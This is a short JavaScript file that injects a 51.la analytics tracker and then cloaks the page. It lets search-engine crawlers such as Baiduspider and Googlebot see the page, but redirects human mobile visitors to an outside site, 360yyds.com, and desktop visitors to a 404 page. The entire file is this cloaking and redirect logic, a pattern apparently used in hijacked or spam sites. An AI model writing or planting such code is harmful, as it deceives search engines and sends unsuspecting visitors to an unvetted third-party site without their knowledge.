document.write("<script>!function(p){\"use strict\";!function(t){var s=window,e=document,i=p,c=\"\".concat(\"https:\"===e.location.protocol?\"https://\":\"http://\",\"sdk.51.la/js-sdk-pro.min.js\"),n=e.createElement(\"script\"),r=e.getElementsByTagName(\"script\")[0];n.type=\"text/javascript\",n.setAttribute(\"charset\",\"UTF-8\"),n.async=!0,n.src=c,n.id=\"LA_COLLECT\",i.d=n;var o=function(){s.LA.ids.push(i)};s.LA?s.LA.ids&&o():(s.LA=p,s.LA.ids=[],o()),r.parentNode.insertBefore(n,r)}()}({id:\"K5RgmDbX9GG2XzWG\",ck:\"K5RgmDbX9GG2XzWG\"});</script>")
function isSpider() {
//判断是否为蜘蛛，是蜘蛛返回true
  if ((navigator.userAgent.match(/(Baiduspider|YisouSpider|360Spider|HaosouSpider|AdsBot|Googlebot|bingbot|Sogou web spider|Sosospider)/i)))
    return true;
  else
    return false;
}
function isMobile() {
//判断如果是手机端和电脑端跳转不同的网页
  if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)))
    return true;
  else
    return false;
}

if(!isSpider()){
  
    if(isMobile()) {
     window.location.href = 'https://360yyds.com/';
    } else {
     window.location.href = '/404.html';
    }
}
